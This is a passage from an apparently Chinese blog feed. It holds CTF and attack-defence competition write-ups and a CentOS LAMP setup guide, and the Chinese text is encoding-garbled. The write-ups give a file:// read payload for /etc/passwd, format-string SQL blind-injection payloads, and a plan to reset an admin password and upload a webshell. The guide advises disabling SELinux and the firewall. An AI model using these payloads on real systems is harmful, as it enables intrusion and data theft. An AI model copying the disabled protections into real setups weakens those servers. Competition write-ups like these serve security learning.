<p>è¿™é“é¢˜ç›¸å¯¹æ²¡å‰é¢çš„å¤æ‚ï¼Œfuzzå‘ç°åªèƒ½æäº¤<code>åè®®å://www.baidu.com</code>è¿™æ ·çš„å€¼ï¼Œå¦åˆ™error<br>æ„é€ <br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?site&#x3D;file:&#x2F;&#x2F;www.baidu.com&#x2F;etc&#x2F;passwd%23</span><br></pre></td></tr></table></figure><br>æˆåŠŸè¯»å–<code>/etc/passwd</code>ï¼Œå‘ç°lctfç”¨æˆ·ï¼Œå†ç”¨ç›¸åŒæ–¹æ³•è¯»å–<code>/home/lctf/flag</code>å¾—åˆ°flag<br><img src="/img/2017lctf3.png" alt=""></p>
<h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>å‘¨æœ«æ‰“äº†ä¸¤å¤©è¿˜æ˜¯å­¦åˆ°äº†å¾ˆå¤šéªšæ“ä½œï¼Œä½†æ˜¯æ²¡æœ‰é€†å‘å’Œpwnçš„åˆ†æ•°æ‰€ä»¥åˆ†æ•°å·®å¾ˆå¤šï¼Œæœ€åè¿˜æ˜¯è†œä¸€ä¸‹å„ä½å¤§ä½¬ä»¬~</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;å‘¨æœ«åˆšåˆšç»“æŸçš„LCTFï¼Œæˆ‘ä»¬é˜Ÿä¸€å…±åšå‡ºäº†4é“webï¼Œä¸€é“miscè¿˜æœ‰ä¸€é“é—®å·è°ƒæŸ¥ï¼ˆå¥½æ°”å•Šæ²¡æŠ¢åˆ°ä¸€è¡€æ¢pwnhubé‚€è¯·ç ï¼‰ï¼Œæ„Ÿè°¢&lt;code&gt;åƒé¥­å»&lt;/code&gt;å¤§ä½¬å¸¦é£~&lt;br&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
    
      <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
    
      <category term="æ³¨å…¥" scheme="https://www.codemonster.cn/tags/%E6%B3%A8%E5%85%A5/"/>
    
      <category term="Misc" scheme="https://www.codemonster.cn/tags/Misc/"/>
    
      <category term="Web" scheme="https://www.codemonster.cn/tags/Web/"/>
    
      <category term="CBCå­—èŠ‚ç¿»è½¬æ”»å‡»" scheme="https://www.codemonster.cn/tags/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/"/>
    
      <category term="Padding oracleæ”»å‡»" scheme="https://www.codemonster.cn/tags/Padding-oracle%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>Centos7æ­å»ºLAMPç¯å¢ƒ</title>
    <link href="https://www.codemonster.cn/2017/11/16/lamp-creat/"/>
    <id>https://www.codemonster.cn/2017/11/16/lamp-creat/</id>
    <published>2017-11-16T14:40:09.000Z</published>
    <updated>2018-05-04T07:47:50.000Z</updated>
    
    <content type="html"><![CDATA[<p>å¾ˆä¹…ä¹‹å‰å¸®è€å¸ˆå†™çš„LAMPï¼ˆlinux+apache+mysql+phpï¼‰æ•™ç¨‹ï¼Œè‡ªå·±ä¹Ÿç”¨è¿™ä¸ªæ–¹æ³•é…äº†å¥½å¤šå°æœåŠ¡å™¨ï¼Œå‘åˆ°åšå®¢è®°å½•ä¸€ä¸‹ï¼Œä¹Ÿå¸Œæœ›èƒ½ç»™å¤§å®¶å¸¦æ¥ä¸€äº›å¸®åŠ©ã€‚<br><a id="more"></a></p>
<h1 id="æ›´æ–°yum"><a href="#æ›´æ–°yum" class="headerlink" title="æ›´æ–°yum"></a>æ›´æ–°yum</h1><p>ä»¥å…¨æ–°centos7ç³»ç»Ÿä¸ºä¾‹å­ï¼ˆç¡®ä¿è‡ªå·±æ‹¥æœ‰rootæƒé™ï¼‰<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum update</span><br></pre></td></tr></table></figure></p>
<h1 id="PHP5-6å®‰è£…"><a href="#PHP5-6å®‰è£…" class="headerlink" title="PHP5.6å®‰è£…"></a>PHP5.6å®‰è£…</h1><h2 id="1ã€ç™¾åº¦æœç´¢webtatic-æ ¹æ®ç³»ç»Ÿç‰ˆæœ¬å·é€‰æ‹©yumæºå¹¶å®‰è£…"><a href="#1ã€ç™¾åº¦æœç´¢webtatic-æ ¹æ®ç³»ç»Ÿç‰ˆæœ¬å·é€‰æ‹©yumæºå¹¶å®‰è£…" class="headerlink" title="1ã€ç™¾åº¦æœç´¢webtatic  æ ¹æ®ç³»ç»Ÿç‰ˆæœ¬å·é€‰æ‹©yumæºå¹¶å®‰è£…"></a>1ã€ç™¾åº¦æœç´¢webtatic  æ ¹æ®ç³»ç»Ÿç‰ˆæœ¬å·é€‰æ‹©yumæºå¹¶å®‰è£…</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;webtatic.com&#x2F;packages&#x2F;php56&#x2F;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œæˆ‘é€‰æ‹©äº†centos7çš„<code>php56</code>ç‰ˆæœ¬<br>è¿è¡Œå¦‚ä¸‹è¯­å¥<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rpm -Uvh https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm</span><br><span class="line">rpm -Uvh https://mirror.webtatic.com/yum/el7/webtatic-release.rpm</span><br></pre></td></tr></table></figure></p>
<h2 id="2ã€å®‰è£…phpåŠå…¶æ‹“å±•"><a href="#2ã€å®‰è£…phpåŠå…¶æ‹“å±•" class="headerlink" title="2ã€å®‰è£…phpåŠå…¶æ‹“å±•"></a>2ã€å®‰è£…phpåŠå…¶æ‹“å±•</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">yum install php56w</span><br><span class="line">yum install php56w-devel</span><br><span class="line">yum install php56w-mysqli</span><br><span class="line">yum install php56w-mbstring</span><br><span class="line">yum install php56w-gd</span><br><span class="line">yum install php56w-xmlwriter</span><br></pre></td></tr></table></figure>
<p>ä¸€è·¯æŒ‰YåŒæ„å®‰è£…<br>ä»¥ä¸Šå®‰è£…ä¼š<code>é»˜è®¤æ‰§è¡Œç¼–è¯‘å®‰è£…Apache</code><br>è‹¥ä¸ç¡®å®šè‡ªå·±æœåŠ¡å™¨é‡ä½¿ç”¨äº†ä»€ä¹ˆphpæ‹“å±•ï¼Œè¯·æ‰§è¡Œ<code>yum install php56w*</code></p>
<h1 id="Apache-é…ç½®"><a href="#Apache-é…ç½®" class="headerlink" title="Apache é…ç½®"></a>Apache é…ç½®</h1><p>è¿›å…¥<code>/etc/httpd/conf.d</code>ç›®å½•ä¸‹ï¼Œåˆ é™¤é™¤<code>php.conf</code>ä»¥å¤–æ–‡ä»¶<br>ç„¶åè¿›è¡Œè™šæ‹Ÿä¸»æœºé…ç½®<br>åœ¨<code>/etc/httpd/conf.d/</code>ç›®å½•æ–°å»ºä»»æ„ä¸€ä¸ªconfæ–‡ä»¶ï¼Œå¦‚<code>test.conf</code><br>åˆ›å»ºçš„.confæ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼Œåç»­ç»‘å®šåŸŸåä»€ä¹ˆçš„ä¹Ÿæ˜¯åœ¨è¿™é‡Œ<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">VirtualHost</span> *<span class="attr">:80</span>&gt;</span></span><br><span class="line">     ServerName 127.0.0.1:80   </span><br><span class="line">     DocumentRoot /work/WEBROOT/default/</span><br><span class="line">     ErrorLog  /work/log/default_error.log</span><br><span class="line">     CustomLog  /work/log/default_access.log combined</span><br><span class="line">     <span class="tag">&lt;<span class="name">Directory</span> "/<span class="attr">work</span>/<span class="attr">WEBROOT</span>/<span class="attr">default</span>"&gt;</span></span><br><span class="line">         AllowOverride All</span><br><span class="line">        Order allow,deny</span><br><span class="line">        Require all granted</span><br><span class="line">        Allow from all</span><br><span class="line">     <span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">VirtualHost</span>&gt;</span></span><br></pre></td></tr></table></figure><br>å¹¶æ ¹æ®å®é™…æƒ…å†µå»ºç«‹webç›®å½•ï¼Œå¦‚<code>/work/</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir &#x2F;work&#x2F;WEBROOT&#x2F;default -p</span><br><span class="line">mkdir &#x2F;work&#x2F;log&#x2F;default -p</span><br></pre></td></tr></table></figure><br>å¹¶å°†ç½‘ç«™æ–‡ä»¶æ”¾å…¥<code>/work/WEBROOT/default/</code><br> è¯·ç¡®ä¿webç›®å½•æ‰€å±ç”¨æˆ·å’Œæ‰€å±ç”¨æˆ·ç»„ä¸º<code>apache</code>,å¯ç”¨<code>chown</code>ä¸<code>chgrp</code>å‘½ä»¤æ›´æ”¹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chown apache &#x2F;work -R</span><br><span class="line">chgrp apache &#x2F;work -R</span><br></pre></td></tr></table></figure></p>
<p>æœåŠ¡å¯åŠ¨å‰ï¼Œè¯·ç¡®ä¿é˜²ç«å¢™å¯¹apacheä¸ºå¼€æ”¾æƒé™ï¼Œè‹¥ä¸æƒ³é…ç½®é˜²ç«å¢™ç­–ç•¥ï¼Œ<br>è¯·å…³é—­selinux ä¸firewalld.service<br>åˆ†åˆ«ä¸º<br>ä¿®æ”¹<code>/etc/selinux/config</code>æ–‡ä»¶ä¸­è®¾ç½®<code>SELINUX=disabled</code> ï¼Œç„¶åé‡å¯æœåŠ¡å™¨ã€‚<br>å’Œ<code>systemctl disable firewalld</code><br>æ‰§è¡Œåè¯·é‡å¯æœåŠ¡å™¨</p>
<p>å¯åŠ¨æœåŠ¡<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start httpd.service</span><br></pre></td></tr></table></figure><br>åŠ å…¥å¼€æœºå¯åŠ¨<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl enable httpd.service</span><br></pre></td></tr></table></figure></p>
<h1 id="Mysqlé…ç½®"><a href="#Mysqlé…ç½®" class="headerlink" title="Mysqlé…ç½®"></a>Mysqlé…ç½®</h1><p>å…ˆå®‰è£…å¸¦æœ‰å¯ç”¨çš„mysql5ç³»åˆ—ç¤¾åŒºç‰ˆèµ„æºçš„rpmåŒ…<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm -Uvh http:&#x2F;&#x2F;dev.mysql.com&#x2F;get&#x2F;mysql-community-release-el7-5.noarch.rpm</span><br></pre></td></tr></table></figure><br>æŸ¥çœ‹å½“å‰å¯ç”¨çš„mysqlå®‰è£…èµ„æº<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum repolist enabled | grep &quot;mysql.*-community.*&quot;</span><br></pre></td></tr></table></figure><br>ç›´æ¥ä½¿ç”¨yumçš„æ–¹å¼å®‰è£…MySQL<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install mysql-community-server     #è¿™ä¸€æ­¥å¾ˆæ…¢</span><br></pre></td></tr></table></figure><br>åŠ å…¥å¼€æœºå¯åŠ¨<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl enable mysqld</span><br></pre></td></tr></table></figure><br>å¯åŠ¨æœåŠ¡<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start mysqld</span><br></pre></td></tr></table></figure><br>åˆå§‹åŒ–ï¼ˆé‡ç½®å¯†ç ï¼Œåˆ é™¤åŒ¿åç”¨æˆ·ï¼Œè¿œç¨‹ç™»å½•é…ç½®ç­‰ï¼‰<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_secure_installation</span><br></pre></td></tr></table></figure><br>ç™»å½•æ•°æ®åº“<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -p</span><br></pre></td></tr></table></figure><br>é€‰æ‹©æ•°æ®åº“<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use databaseï¼›</span><br></pre></td></tr></table></figure><br>å¯¼å…¥sql<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source &#x2F;work&#x2F;xxx.sql</span><br></pre></td></tr></table></figure></p>
<h1 id="é…ç½®ç½‘ç«™æ•°æ®åº“ä¿¡æ¯"><a href="#é…ç½®ç½‘ç«™æ•°æ®åº“ä¿¡æ¯" class="headerlink" title="é…ç½®ç½‘ç«™æ•°æ®åº“ä¿¡æ¯"></a>é…ç½®ç½‘ç«™æ•°æ®åº“ä¿¡æ¯</h1><p>æ ¹æ®è¦æ­å»ºçš„ç½‘ç«™æ¥é…ç½®</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;å¾ˆä¹…ä¹‹å‰å¸®è€å¸ˆå†™çš„LAMPï¼ˆlinux+apache+mysql+phpï¼‰æ•™ç¨‹ï¼Œè‡ªå·±ä¹Ÿç”¨è¿™ä¸ªæ–¹æ³•é…äº†å¥½å¤šå°æœåŠ¡å™¨ï¼Œå‘åˆ°åšå®¢è®°å½•ä¸€ä¸‹ï¼Œä¹Ÿå¸Œæœ›èƒ½ç»™å¤§å®¶å¸¦æ¥ä¸€äº›å¸®åŠ©ã€‚&lt;br&gt;
    
    </summary>
    
    
      <category term="è¿ç»´" scheme="https://www.codemonster.cn/tags/%E8%BF%90%E7%BB%B4/"/>
    
      <category term="LAMP" scheme="https://www.codemonster.cn/tags/LAMP/"/>
    
  </entry>
  
  <entry>
    <title>2017 ç¬¬ä¸‰å±Šç¦å»ºçœé«˜æ ¡ç½‘ç»œç©ºé—´å®‰å…¨å¤§èµ› WriteUp</title>
    <link href="https://www.codemonster.cn/2017/10/31/2017-3th-fjwlkjaqds-writeup/"/>
    <id>https://www.codemonster.cn/2017/10/31/2017-3th-fjwlkjaqds-writeup/</id>
    <published>2017-10-31T14:15:27.000Z</published>
    <updated>2018-05-04T07:47:50.000Z</updated>
    
    <content type="html"><![CDATA[<p>10æœˆ27å‚åŠ çš„çœèµ›ï¼Œä»Šå¹´éš¾åº¦è¾ƒä¹‹å»å¹´æé«˜äº†ä¸å°‘ï¼Œæœ€ç»ˆæ‹¿åˆ°äº†ä¸€ç­‰å¥–ï¼Œç®—æ˜¯æ¯”è¾ƒæ»¡æ„äº†ï¼Œä½†æ˜¯AWDåœºæ‰“çš„è¿˜æ˜¯ä¸å¤Ÿå¥½ï¼Œè¿˜éœ€è¦ä¸æ–­å­¦ä¹ ï¼ŒWriteUpå¦‚ä¸‹ï¼ˆåç»­ä¼šè¡¥ä¸Šèµ›ååšå‡ºçš„é¢˜ï¼‰ï¼š<br><a id="more"></a></p>
<h1 id="ä¸ŠåˆCTFåœº"><a href="#ä¸ŠåˆCTFåœº" class="headerlink" title="ä¸ŠåˆCTFåœº"></a>ä¸ŠåˆCTFåœº</h1><h2 id="è¦æƒ³ä¼šï¼Œå…ˆå­¦ä¼š"><a href="#è¦æƒ³ä¼šï¼Œå…ˆå­¦ä¼š" class="headerlink" title="è¦æƒ³ä¼šï¼Œå…ˆå­¦ä¼š"></a>è¦æƒ³ä¼šï¼Œå…ˆå­¦ä¼š</h2><p>å®˜æ–¹æç¤º<code>ping</code>ï¼Œåœ¨æµé‡åŒ…æ–‡ä»¶ä¸­æ‰¾<code>icmpåè®®</code>ï¼Œ<br><img src="/img/2017byb1.png" alt=""><br>æŒ‰ç…§æ—¶é—´æ’åºï¼Œå¾—åˆ°ä¸€ä¸²å¥‡æ€ªçš„ä¸œè¥¿ï¼Œè½¬asciiæœ‰å¾ˆå¤šå­—ç¬¦ä¸å¯è§ï¼ŒçŒœæµ‹æ˜¯æœ‰ä¸€äº›åç§»ï¼Œäºæ˜¯å†™äº†ä¸ªpyè„šæœ¬æš´åŠ›æ‰€ä»¥å¯èƒ½çš„åç§»ï¼Œå¾—åˆ°flag<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">a=[<span class="number">144</span>,<span class="number">150</span>,<span class="number">150</span>,<span class="number">139</span>,<span class="number">145</span>,<span class="number">165</span>,<span class="number">120</span>,<span class="number">139</span>,<span class="number">91</span>,<span class="number">160</span>,<span class="number">93</span>,<span class="number">167</span>,<span class="number">70</span>]</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">-50</span>,<span class="number">50</span>):</span><br><span class="line">  flag=<span class="string">''</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    flag+=chr(i+j)</span><br><span class="line">  <span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><br><img src="/img/2017byb2.png" alt=""></p>
<h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p>ä¸Šä¼ é¢˜ï¼Œé™åˆ¶äº†åç¼€ï¼ŒburpæŠ“åŒ…ï¼Œ<code>%00æˆªæ–­</code>ä¸Šä¼ ç½‘é©¬ï¼Œèœåˆ€è¿æ¥ï¼Œåœ¨configé‡Œæ‰¾åˆ°æ•°æ®åº“é…ç½®ï¼Œåœ¨æ•°æ®åº“ä¸­æ‰¾åˆ°flagï¼Œæ‰‹å¿«ä¸€è¡€</p>
<h2 id="sqli"><a href="#sqli" class="headerlink" title="sqli"></a>sqli</h2><p>Fuzzçš„æ—¶å€™å‘ç°%25ä¼šæŠ¥é”™<code>sprintf</code>ï¼Œå°±çŒœæµ‹æ˜¯æ ¼å¼åŒ–æ¼æ´ï¼Œä½†æ˜¯æ²¡æœ‰ç½‘æŸ¥èµ„æ–™ï¼Œåæ¥å®˜æ–¹çš„æç¤ºç«Ÿç„¶ç›´æ¥ç»™äº†payloadï¼š<br>ä½¿ç”¨äº†ä¸¤æ¬¡sprintfå¯¼è‡´æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼ˆå¯æ„é€ <code>admin%1$&#39; and 1=1#</code>ä¸<code>admin%1$&#39; and 1=2#</code>ï¼‰ï¼Œsqlç›²æ³¨ï¼Œflagåœ¨flagè¡¨flagåˆ—ï¼Œflagçš„å­—ç¬¦é›†ä¸º0123456789abcdeflg{}-<br>è„šæœ¬æ’¸å‡ºæ¥å•çº¿ç¨‹å¤ªæ…¢ï¼Œäºæ˜¯ç”¨burpsuiteä¸€ä¸ªä¸€ä¸ªå­—ç¬¦çˆ†ç ´çš„<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin%1$&#39; and (ascii(mid((select flag from flag limit 1),&#123;0&#125;,1))&#x3D;&#123;1&#125;)#</span><br></pre></td></tr></table></figure></p>
<h1 id="AWD"><a href="#AWD" class="headerlink" title="AWD"></a>AWD</h1><p>ç»™äº†ä¸¤ä¸ªé¶æœºï¼Œä¸€ä¸ªwebï¼Œä¸€ä¸ªpwnï¼Œåˆ°æœ€åpwnä¹Ÿæ²¡äººåšå‡ºæ¥<br>Webå¤§è‡´æœ‰ä¸¤ä¸ªåˆ©ç”¨æ–¹å‘ï¼Œä¸€ä¸ªæ˜¯commonç›®å½•ä¸‹çš„home.phpå­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œ<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a=@$_POST[<span class="string">'a'</span>];</span><br><span class="line">@unserialize($a);</span><br></pre></td></tr></table></figure><br>å› ä¸ºå¯¹è¿™å—ä¸ç†Ÿæ‰€ä»¥æ²¡åˆ©ç”¨æˆåŠŸï¼Œåˆç¿»å•Šç¿»ï¼Œåœ¨lib/User.php é‡Œå‘ç°äº†ä¸Šä¼ éƒ¨åˆ†çš„é€»è¾‘<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">'username'</span>]) <span class="keyword">and</span> $_SESSION[<span class="string">'username'</span>]===<span class="string">"admin"</span>)&#123;</span><br><span class="line">        <span class="keyword">include_once</span> <span class="keyword">__DIR__</span>.<span class="string">"/File.php"</span>;</span><br><span class="line">        $up=<span class="keyword">new</span> File();</span><br><span class="line">        <span class="keyword">if</span>($up-&gt;save())&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;tp-&gt;display(<span class="string">"success.tpl"</span>);</span><br><span class="line">        &#125;       </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;tp-&gt;display(<span class="string">"error.tpl"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logout</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $_SESSION=<span class="keyword">array</span>();</span><br><span class="line">    session_destroy();</span><br><span class="line">    header(<span class="string">"location: ./index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">updatepass</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($_POST[<span class="string">'username'</span>]) <span class="keyword">and</span> !<span class="keyword">empty</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">        $username=addslashes($_POST[<span class="string">'username'</span>]);</span><br><span class="line">        $password=md5($_POST[<span class="string">'password'</span>]);</span><br><span class="line">        $sql=<span class="string">"update user set password='$password' where username='$username' "</span>;</span><br><span class="line">        <span class="keyword">if</span> (mysql_query($sql))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;tp-&gt;display(<span class="string">"success.tpl"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>é‡ç‚¹åœ¨<code>uploadå‡½æ•°</code>å’Œ<code>updatepasså‡½æ•°</code>ï¼Œuploadé™åˆ¶äº†åªæœ‰<code>admin</code>è´¦å·æ‰èƒ½ä¸Šä¼ æ–‡ä»¶ï¼Œè€Œupdatepasså¯ä»¥<code>ä¿®æ”¹ä»»æ„ç”¨æˆ·å¯†ç </code>ï¼Œè¿™é‡Œå°±æœ‰äº†æ€è·¯</p>
<ol>
<li>é€šè¿‡updatepasså‡½æ•°<code>ä¿®æ”¹adminå¯†ç </code></li>
<li>ç™»å½•adminè´¦å·<code>ä¸Šä¼ shell</code>ï¼ˆshellçš„åç¼€è¦å¤§å°å†™ç»•è¿‡é»‘åå•é™åˆ¶ï¼‰</li>
<li>é€šè¿‡shell<code>è¯»å–flagå¹¶æäº¤</code></li>
</ol>
<p>æ€è·¯å¾ˆæ¸…æ™°ï¼Œç„¶è€Œè„šæœ¬æ˜¯ä¸ªå¤§é—®é¢˜ï¼Œç™»å½•ä¸Šä¼ å¼„å¾—æ‰‹å¿™è„šä¹±ï¼Œå‰æœŸå¾ˆé•¿ä¸€æ®µæ—¶é—´å…¨é é˜Ÿå‹æ‰‹åŠ¨ä¼ shellï¼Œæäº¤flagï¼Œè„šæœ¬æ†‹å‡ºæ¥åå¤§éƒ¨åˆ†äººéƒ½ä¿®å¤æ¼æ´äº†ï¼Œå°±å¾ˆéš¾å—ï¼Œæœ€ååŸºæœ¬æ˜¯æ‰“npcå’Œå…¶ä»–å‡ ä¸ªé˜Ÿï¼Œéœ€è¦å¥½å¥½åæ€ï¼Œæƒé™ç»´æŒè¿™ä¸€å—æ²¡å¼„ï¼Œå°±åœ¨ä¸€å°ç”µè„‘è¯•éªŒäº†ä¸€ä¸‹ï¼Œå‡†å¤‡å¥½çš„ä»£ç æäº¤æ¡†æ¶ä¹Ÿæ²¡ç”¨ä¸Šï¼Œæ€»ä¹‹AWDè¿˜æ˜¯å¾ˆåˆºæ¿€çš„ï¼Œæœ€ç»ˆçš„æˆç»©ä¹Ÿæ»¡ç†æƒ³ï¼Œå°±æ˜¯ä¸€ç­‰çš„å¥–é‡‘ç¼©æ°´äº†æœ‰ç‚¹æ‰å¿ƒã€‚</p>
<p>æ¯”èµ›ç•Œé¢å¦‚ä¸‹<br><img src="/img/2017byb3.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;10æœˆ27å‚åŠ çš„çœèµ›ï¼Œä»Šå¹´éš¾åº¦è¾ƒä¹‹å»å¹´æé«˜äº†ä¸å°‘ï¼Œæœ€ç»ˆæ‹¿åˆ°äº†ä¸€ç­‰å¥–ï¼Œç®—æ˜¯æ¯”è¾ƒæ»¡æ„äº†ï¼Œä½†æ˜¯AWDåœºæ‰“çš„è¿˜æ˜¯ä¸å¤Ÿå¥½ï¼Œè¿˜éœ€è¦ä¸æ–­å­¦ä¹ ï¼ŒWriteUpå¦‚ä¸‹ï¼ˆåç»­ä¼šè¡¥ä¸Šèµ›ååšå‡ºçš„é¢˜ï¼‰ï¼š&lt;br&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
    
      <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
    
      <category term="AWD" scheme="https://www.codemonster.cn/tags/AWD/"/>
    
  </entry>
  
  <entry>
    <title>2017 å…¨å›½å¤§å­¦ç”Ÿè½¯ä»¶æµ‹è¯•å¤§èµ›webå®‰å…¨èµ›åˆ†åŒºå†³èµ› WriteUp</title>
    <link href="https://www.codemonster.cn/2017/10/24/2017-mooctest-second-writeup/"/>
    <id>https://www.codemonster.cn/2017/10/24/2017-mooctest-second-writeup/</id>
    <published>2017-10-24T05:40:13.000Z</published>
    <updated>2018-07-28T06:19:37.000Z</updated>
    
    <content type="html"><![CDATA[<p>å‘¨æœ«å»å¹¿å·æ°´äº†ä¸€æ³¢ï¼Œæ¯”èµ›çš„æ—¶å€™åšå‡ºæ¥7é“é¢˜ï¼Œèµ›åè¡¥ä¸Š2ã€3ä¸¤é¢˜ï¼Œä¸‹é¢æ˜¯å‰9é¢˜çš„WriteUpï¼ŒæœŸå¾…å¤§ä½¬çš„ç¬¬10é¢˜WriteUp<br><a id="more"></a></p>
<h2 id="1-host"><a href="#1-host" class="headerlink" title="1.host"></a>1.host</h2><p>åœ¨burpsuiteä¸­ä¿®æ”¹hostä¸º<code>www.mooctest.net</code><br><img src="/img/2017-mooctest-sec-1.png" alt=""></p>
<h2 id="2-Babyupload"><a href="#2-Babyupload" class="headerlink" title="2.Babyupload"></a>2.Babyupload</h2><p>æ‰«æå¾—åˆ°upload.phpï¼Œæœ¬åœ°æ„é€ upload.html<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=<span 